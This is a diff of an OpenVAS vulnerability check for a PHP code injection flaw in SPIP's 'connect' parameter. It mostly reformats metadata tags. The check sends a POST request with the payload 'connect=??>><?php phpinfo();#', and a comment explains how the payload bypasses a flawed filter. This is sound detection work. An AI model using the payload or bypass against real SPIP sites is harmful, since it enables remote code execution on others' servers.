@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_spip_54292.nasl 6755 2017-07-18 12:55:56Z cfischer $
+# $Id: gb_spip_54292.nasl 11056 2018-08-20 13:34:00Z mmartin $
 #
 # SPIP 'connect' Parameter PHP Code Injection Vulnerability
 #
@@ -24,57 +24,46 @@
 # along with this program; if not, write to the Free Software
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
-
-tag_impact = "An attacker can exploit this issue to inject and execute arbitrary PHP
-code in the context of the affected application. This may facilitate a
-compromise of the application and the underlying system; other attacks
-are also possible.
-Impact Level: Application/System";
-
-SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103777";
 CPE = "cpe:/a:spip:spip";
-
-tag_insight = "SPIP contains a flaw that is triggered when input passed via the 'connect'
-parameter is not properly sanitized before being used.";
-
-
-tag_affected = "SPIP versions prior to 2.0.21, 2.1.16, and 3.0.3 are vulnerable. Other version may also affected.";
-tag_summary = "SPIP is prone to a remote PHP code-injection vulnerability.";
-tag_solution = "Vendor updates are available.";
-tag_vuldetect = "Tries to execute the phpinfo() function by sending a HTTP POST request.";
 
 if (description)
 {
- script_oid(SCRIPT_OID);
- script_bugtraq_id(54292);
- script_cve_id("CVE-2013-4555", "CVE-2013-4556", "CVE-2013-4557");
- script_tag(name:"cvss_base", value:"7.5");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
- script_version ("$Revision: 6755 $");
+  script_oid("1.3.6.1.4.1.25623.1.0.103777");
+  script_bugtraq_id(54292);
+  script_cve_id("CVE-2013-4555", "CVE-2013-4556", "CVE-2013-4557");
+  script_tag(name:"cvss_base", value:"7.5");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
+  script_version("$Revision: 11056 $");
 
- script_name("SPIP 'connect' Parameter PHP Code Injection Vulnerability");
+  script_name("SPIP 'connect' Parameter PHP Code Injection Vulnerability");
 
 
- script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54292");
- script_xref(name:"URL", value:"http://www.spip.net/en");
- script_xref(name:"URL", value:"http://www.securitytracker.com/id/1029317");
- 
- script_tag(name:"last_modification", value:"$Date: 2017-07-18 14:55:56 +0200 (Tue, 18 Jul 2017) $");
- script_tag(name:"creation_date", value:"2013-08-29 12:05:48 +0200 (Thu, 29 Aug 2013)");
- script_category(ACT_ATTACK);
- script_tag(name:"qod_type", value:"remote_vul");
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
- script_dependencies("gb_spip_detect.nasl");
- script_require_ports("Services/www", 80);
- script_mandatory_keys("spip/installed");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54292");
+  script_xref(name:"URL", value:"http://www.spip.net/en");
+  script_xref(name:"URL", value:"http://www.securitytracker.com/id/1029317");
 
- script_tag(name : "impact" , value : tag_impact);
- script_tag(name : "vuldetect" , value : tag_vuldetect);
- script_tag(name : "insight" , value : tag_insight);
- script_tag(name : "solution" , value : tag_solution);
- script_tag(name : "summary" , value : tag_summary);
- script_tag(name : "affected" , value : tag_affected);
+  script_tag(name:"last_modification", value:"$Date: 2018-08-20 15:34:00 +0200 (Mon, 20 Aug 2018) $");
+  script_tag(name:"creation_date", value:"2013-08-29 12:05:48 +0200 (Thu, 29 Aug 2013)");
+  script_category(ACT_ATTACK);
+  script_tag(name:"qod_type", value:"remote_vul");
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
+  script_dependencies("gb_spip_detect.nasl");
+  script_require_ports("Services/www", 80);
+  script_mandatory_keys("spip/installed");
+
+  script_tag(name:"impact", value:"An attacker can exploit this issue to inject and execute arbitrary PHP
+code in the context of the affected application. This may facilitate a
+compromise of the application and the underlying system, other attacks
+are also possible.
+Impact Level: Application/System");
+  script_tag(name:"vuldetect", value:"Tries to execute the phpinfo() function by sending a HTTP POST request.");
+  script_tag(name:"insight", value:"SPIP contains a flaw that is triggered when input passed via the 'connect'
+parameter is not properly sanitized before being used.");
+  script_tag(name:"solution", value:"Vendor updates are available.");
+  script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"summary", value:"SPIP is prone to a remote PHP code-injection vulnerability.");
+  script_tag(name:"affected", value:"SPIP versions prior to 2.0.21, 2.1.16, and 3.0.3 are vulnerable. Other version may also affected.");
 
  exit(0);
 }
@@ -82,32 +71,32 @@ if (description)
 include("http_func.inc");
 include("host_details.inc");
 
-if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
-if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);
+if(!port = get_app_port(cpe:CPE))exit(0);
+if(!dir = get_app_location(cpe:CPE, port:port))exit(0);
 
 host = http_host_name(port:port);
 
 for(i=0;i<2;i++) { # sometimes there is no output from phpinfo() on the first request. So try twice...
 
   ex = 'connect=??>><?php phpinfo();#'; # there is a typo in ecran_securite.php (line 260) which makes str_replace() looking for the string "?>". With "??>>" we could bypass this workaround. Some installations also need to comment out all behind the command...
-  len=strlen(ex);                       
+  len=strlen(ex);
 
   req = 'POST ' + dir + '/spip.php HTTP/1.1\r\n' +
-        'Host: ' + host + '\r\n' + 
+        'Host: ' + host + '\r\n' +
         'Content-Type: application/x-www-form-urlencoded\r\n' +
-        'Content-Length: ' + len + '\r\n' + 
-        'Connection: close\r\n' + 
-        '\r\n' + 
+        'Content-Length: ' + len + '\r\n' +
+        'Connection: close\r\n' +
+        '\r\n' +
         ex;
 
   result = http_send_recv(port:port, data:req, bodyonly:FALSE);
 
   if("<title>phpinfo()</title>" >< result) {
-  
+
     security_message(port:port);
     exit(0);
 
-  }  
+  }
 
 }
 
